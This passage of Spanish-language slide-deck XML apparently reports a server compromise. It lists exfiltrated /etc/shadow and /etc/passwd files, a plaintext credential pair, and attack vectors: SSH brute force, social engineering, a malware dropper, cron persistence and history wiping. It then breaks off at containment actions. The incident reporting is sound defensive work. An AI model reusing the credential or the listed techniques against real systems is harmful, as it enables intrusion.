          <draw:image xlink:href="media/image15.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="1.05in" svg:y="0.1in" svg:width="9.2in" svg:height="0.55in" draw:id="id196" draw:style-name="a589" draw:name="Text 1">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a588" text:class-names="" text:cond-style-name=""><text:span text:style-name="a586" text:class-names="">Impacto del Incidente</text:span><text:span text:style-name="a587"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197" draw:style-name="a593" draw:name="Text 2">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a592" text:class-names="" text:cond-style-name=""><text:span text:style-name="a590" text:class-names="">Alcance real del compromiso y datos afectados</text:span><text:span text:style-name="a591" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.38in" svg:y="1.3in" svg:width="2.1in" svg:height="1.45in" draw:id="id198" draw:style-name="a594" draw:name="Shape 3">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.38in" svg:y="1.35in" svg:width="2.1in" svg:height="0.75in" draw:id="id199" draw:style-name="a598" draw:name="Text 4">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a597" text:class-names="" text:cond-style-name=""><text:span text:style-name="a595" text:class-names="">~1 año</text:span><text:span text:style-name="a596" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.38in" svg:y="2.08in" svg:width="2.1in" svg:height="0.55in" draw:id="id200" draw:style-name="a605" draw:name="Text 5">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a601" text:class-names="" text:cond-style-name=""><text:span text:style-name="a599" text:class-names="">servidor comprometido</text:span><text:span text:style-name="a600" text:class-names=""/></text:p>
          <text:p text:style-name="a604" text:class-names="" text:cond-style-name=""><text:span text:style-name="a602" text:class-names="">sin detección</text:span><text:span text:style-name="a603" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="2.63in" svg:y="1.3in" svg:width="2.1in" svg:height="1.45in" draw:id="id201" draw:style-name="a606" draw:name="Shape 6">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="2.63in" svg:y="1.35in" svg:width="2.1in" svg:height="0.75in" draw:id="id202" draw:style-name="a610" draw:name="Text 7">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a609" text:class-names="" text:cond-style-name=""><text:span text:style-name="a607" text:class-names="">11</text:span><text:span text:style-name="a608" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="2.63in" svg:y="2.08in" svg:width="2.1in" svg:height="0.55in" draw:id="id203" draw:style-name="a617" draw:name="Text 8">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a613" text:class-names="" text:cond-style-name=""><text:span text:style-name="a611" text:class-names="">vulnerabilidades</text:span><text:span text:style-name="a612" text:class-names=""/></text:p>
          <text:p text:style-name="a616" text:class-names="" text:cond-style-name=""><text:span text:style-name="a614" text:class-names="">detectadas y corregidas</text:span><text:span text:style-name="a615" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="4.88in" svg:y="1.3in" svg:width="2.1in" svg:height="1.45in" draw:id="id204" draw:style-name="a618" draw:name="Shape 9">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="4.88in" svg:y="1.35in" svg:width="2.1in" svg:height="0.75in" draw:id="id205" draw:style-name="a622" draw:name="Text 10">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a621" text:class-names="" text:cond-style-name=""><text:span text:style-name="a619" text:class-names="">4</text:span><text:span text:style-name="a620" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="4.88in" svg:y="2.08in" svg:width="2.1in" svg:height="0.55in" draw:id="id206" draw:style-name="a629" draw:name="Text 11">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a625" text:class-names="" text:cond-style-name=""><text:span text:style-name="a623" text:class-names="">IPs del atacante</text:span><text:span text:style-name="a624" text:class-names=""/></text:p>
          <text:p text:style-name="a628" text:class-names="" text:cond-style-name=""><text:span text:style-name="a626" text:class-names="">identificadas</text:span><text:span text:style-name="a627" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="7.13in" svg:y="1.3in" svg:width="2.1in" svg:height="1.45in" draw:id="id207" draw:style-name="a630" draw:name="Shape 12">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="7.13in" svg:y="1.35in" svg:width="2.1in" svg:height="0.75in" draw:id="id208" draw:style-name="a634" draw:name="Text 13">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a633" text:class-names="" text:cond-style-name=""><text:span text:style-name="a631" text:class-names="">100%</text:span><text:span text:style-name="a632" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="7.13in" svg:y="2.08in" svg:width="2.1in" svg:height="0.55in" draw:id="id209" draw:style-name="a641" draw:name="Text 14">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a637" text:class-names="" text:cond-style-name=""><text:span text:style-name="a635" text:class-names="">de amenazas</text:span><text:span text:style-name="a636" text:class-names=""/></text:p>
          <text:p text:style-name="a640" text:class-names="" text:cond-style-name=""><text:span text:style-name="a638" text:class-names="">erradicadas</text:span><text:span text:style-name="a639" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.38in" svg:y="2.88in" svg:width="4.35in" svg:height="2.5in" draw:id="id210" draw:style-name="a642" draw:name="Shape 15">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.38in" svg:y="2.88in" svg:width="4.35in" svg:height="0.4in" draw:id="id211" draw:style-name="a643" draw:name="Shape 16">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.5in" svg:y="2.93in" svg:width="4.15in" svg:height="0.32in" draw:id="id212" draw:style-name="a647" draw:name="Text 17">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a646" text:class-names="" text:cond-style-name=""><text:span text:style-name="a644" text:class-names="">Datos comprometidos</text:span><text:span text:style-name="a645" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.52in" svg:y="3.37in" svg:width="4in" svg:height="0.22in" draw:id="id213" draw:style-name="a651" draw:name="Text 18">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a650" text:class-names="" text:cond-style-name=""><text:span text:style-name="a648" text:class-names="">🔴 /etc/shadow</text:span><text:span text:style-name="a649" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.52in" svg:y="3.57in" svg:width="4in" svg:height="0.22in" draw:id="id214" draw:style-name="a655" draw:name="Text 19">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a654" text:class-names="" text:cond-style-name=""><text:span text:style-name="a652" text:class-names="">Hashes de contraseñas de TODOS los usuarios — exfiltración confirmada</text:span><text:span text:style-name="a653" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.52in" svg:y="3.85in" svg:width="4in" svg:height="0.22in" draw:id="id215" draw:style-name="a659" draw:name="Text 20">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a658" text:class-names="" text:cond-style-name=""><text:span text:style-name="a656" text:class-names="">🔴 /etc/passwd</text:span><text:span text:style-name="a657" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.52in" svg:y="4.05in" svg:width="4in" svg:height="0.22in" draw:id="id216" draw:style-name="a663" draw:name="Text 21">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a662" text:class-names="" text:cond-style-name=""><text:span text:style-name="a660" text:class-names="">Lista de usuarios del sistema — exfiltración confirmada</text:span><text:span text:style-name="a661" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.52in" svg:y="4.33in" svg:width="4in" svg:height="0.22in" draw:id="id217" draw:style-name="a667" draw:name="Text 22">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a666" text:class-names="" text:cond-style-name=""><text:span text:style-name="a664" text:class-names="">🟡 Credenciales reports</text:span><text:span text:style-name="a665" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.52in" svg:y="4.53in" svg:width="4in" svg:height="0.22in" draw:id="id218" draw:style-name="a671" draw:name="Text 23">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a670" text:class-names="" text:cond-style-name=""><text:span text:style-name="a668" text:class-names="">reports:reports123 en texto plano en /opt/.archive/</text:span><text:span text:style-name="a669" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.52in" svg:y="4.81in" svg:width="4in" svg:height="0.22in" draw:id="id219" draw:style-name="a675" draw:name="Text 24">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a674" text:class-names="" text:cond-style-name=""><text:span text:style-name="a672" text:class-names="">🟡 Historial de comandos</text:span><text:span text:style-name="a673" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.52in" svg:y="5.01in" svg:width="4in" svg:height="0.22in" draw:id="id220" draw:style-name="a679" draw:name="Text 25">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a678" text:class-names="" text:cond-style-name=""><text:span text:style-name="a676" text:class-names="">Actividad del administrador accesible al atacante</text:span><text:span text:style-name="a677" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="4.9in" svg:y="2.88in" svg:width="4.73in" svg:height="2.5in" draw:id="id221" draw:style-name="a680" draw:name="Shape 26">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="4.9in" svg:y="2.88in" svg:width="4.73in" svg:height="0.4in" draw:id="id222" draw:style-name="a681" draw:name="Shape 27">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.02in" svg:y="2.93in" svg:width="4.53in" svg:height="0.32in" draw:id="id223" draw:style-name="a685" draw:name="Text 28">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a684" text:class-names="" text:cond-style-name=""><text:span text:style-name="a682" text:class-names="">Vectores de ataque identificados</text:span><text:span text:style-name="a683" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.04in" svg:y="3.37in" svg:width="4.45in" svg:height="0.22in" draw:id="id224" draw:style-name="a689" draw:name="Text 29">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a688" text:class-names="" text:cond-style-name=""><text:span text:style-name="a686" text:class-names="">▸ Fuerza bruta SSH</text:span><text:span text:style-name="a687" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.04in" svg:y="3.57in" svg:width="4.45in" svg:height="0.22in" draw:id="id225" draw:style-name="a693" draw:name="Text 30">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a692" text:class-names="" text:cond-style-name=""><text:span text:style-name="a690" text:class-names="">192.168.1.103 → múltiples usuarios en segundos</text:span><text:span text:style-name="a691" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.04in" svg:y="3.81in" svg:width="4.45in" svg:height="0.22in" draw:id="id226" draw:style-name="a697" draw:name="Text 31">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a696" text:class-names="" text:cond-style-name=""><text:span text:style-name="a694" text:class-names="">▸ Ingeniería social</text:span><text:span text:style-name="a695" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.04in" svg:y="4.01in" svg:width="4.45in" svg:height="0.22in" draw:id="id227" draw:style-name="a701" draw:name="Text 32">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a700" text:class-names="" text:cond-style-name=""><text:span text:style-name="a698" text:class-names="">Correo externo convincente a usuario sin formación</text:span><text:span text:style-name="a699" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.04in" svg:y="4.25in" svg:width="4.45in" svg:height="0.22in" draw:id="id228" draw:style-name="a705" draw:name="Text 33">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a704" text:class-names="" text:cond-style-name=""><text:span text:style-name="a702" text:class-names="">▸ Dropper + payload</text:span><text:span text:style-name="a703" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.04in" svg:y="4.45in" svg:width="4.45in" svg:height="0.22in" draw:id="id229" draw:style-name="a709" draw:name="Text 34">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a708" text:class-names="" text:cond-style-name=""><text:span text:style-name="a706" text:class-names="">Script que descarga y ejecuta malware automáticamente</text:span><text:span text:style-name="a707" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.04in" svg:y="4.69in" svg:width="4.45in" svg:height="0.22in" draw:id="id230" draw:style-name="a713" draw:name="Text 35">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a712" text:class-names="" text:cond-style-name=""><text:span text:style-name="a710" text:class-names="">▸ Persistencia vía cron</text:span><text:span text:style-name="a711" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.04in" svg:y="4.89in" svg:width="4.45in" svg:height="0.22in" draw:id="id231" draw:style-name="a717" draw:name="Text 36">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a716" text:class-names="" text:cond-style-name=""><text:span text:style-name="a714" text:class-names="">Ejecutado como root — sobrevive reinicios</text:span><text:span text:style-name="a715" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.04in" svg:y="5.13in" svg:width="4.45in" svg:height="0.22in" draw:id="id232" draw:style-name="a721" draw:name="Text 37">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a720" text:class-names="" text:cond-style-name=""><text:span text:style-name="a718" text:class-names="">▸ Anti-forense</text:span><text:span text:style-name="a719" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.04in" svg:y="5.33in" svg:width="4.45in" svg:height="0.22in" draw:id="id233" draw:style-name="a725" draw:name="Text 38">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a724" text:class-names="" text:cond-style-name=""><text:span text:style-name="a722" text:class-names="">Historial borrado + historial falso fabricado</text:span><text:span text:style-name="a723" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <presentation:notes draw:style-name="a731">
          <draw:page-thumbnail draw:page-number="6" svg:x="-0.1875in" svg:y="1.25in" svg:width="6in" svg:height="3.375in" presentation:class="page" draw:id="id234" presentation:style-name="a726" draw:name="Slide Image Placeholder 1">
            <svg:title/>
            <svg:desc/>
          </draw:page-thumbnail>
          <draw:frame draw:id="id235" presentation:style-name="a727" draw:name="Notes Placeholder 2" svg:x="0.5625in" svg:y="4.8125in" svg:width="4.5in" svg:height="3.9375in" presentation:class="notes" presentation:placeholder="true">
            <draw:text-box/>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
          <draw:frame draw:id="id236" presentation:style-name="a730" draw:name="Slide Number Placeholder 3" svg:x="3.18576in" svg:y="9.49826in" svg:width="2.4375in" svg:height="0.50174in" presentation:class="page-number" presentation:placeholder="false">
            <draw:text-box>
              <text:p text:style-name="a729" text:class-names="" text:cond-style-name=""><text:span text:style-name="a728" text:class-names=""><text:page-number style:num-format="1" text:fixed="false">6</text:page-number></text:span></text:p>
            </draw:text-box>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
        </presentation:notes>
      </draw:page>
      <draw:page draw:name="Slide 7" draw:style-name="a732" draw:master-page-name="Master1-Layout1-cust-DEFAULT" presentation:presentation-page-layout-name="Master1-PPL1" draw:id="Slide-262">
        <draw:custom-shape svg:x="0in" svg:y="0in" svg:width="10in" svg:height="1.2in" draw:id="id237" draw:style-name="a733" draw:name="Shape 0">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id238" draw:style-name="a734" draw:name="Image 0" svg:x="0.32in" svg:y="0.28in" svg:width="0.58in" svg:height="0.58in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image16.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="1.05in" svg:y="0.1in" svg:width="9.2in" svg:height="0.55in" draw:id="id239" draw:style-name="a738" draw:name="Text 1">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a737" text:class-names="" text:cond-style-name=""><text:span text:style-name="a735" text:class-names="">¿Qué hicimos? — Acciones de Contención y Erradicación</text:span><text:span text:style-name="a736"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240" draw:style-name="a742" draw:name="Text 2">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a741" text:class-names="" text:cond-style-name=""><text:span text:style-name="a739" text:class-names="">15 acciones ejecutadas en orden de prioridad — sin apagar el servidor ni interrumpir el servicio</text:span><text:span text:style-name="a740" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="1.3in" svg:width="4.72in" svg:height="1.28in" draw:id="id241" draw:style-name="a743" draw:name="Shape 3">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="1.3in" svg:width="0.8in" svg:height="1.28in" draw:id="id242" draw:style-name="a744" draw:name="Shape 4">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="1.35in" svg:width="0.8in" svg:height="0.38in" draw:id="id243" draw:style-name="a748" draw:name="Text 5">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a747" text:class-names="" text:cond-style-name=""><text:span text:style-name="a745" text:class-names="">01</text:span><text:span text:style-name="a746" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id244" draw:style-name="a749" draw:name="Image 1" svg:x="0.47in" svg:y="1.8in" svg:width="0.45in" svg:height="0.45in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image17.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="1.22in" svg:y="1.36in" svg:width="3.7in" svg:height="0.3in" draw:id="id245" draw:style-name="a753" draw:name="Text 6">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a752" text:class-names="" text:cond-style-name=""><text:span text:style-name="a750" text:class-names="">Bloqueamos al atacante</text:span><text:span text:style-name="a751" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="1.22in" svg:y="1.66in" svg:width="3.7in" svg:height="0.82in" draw:id="id246" draw:style-name="a757" draw:name="Text 7">
          <svg:title/>
          <svg:desc/>
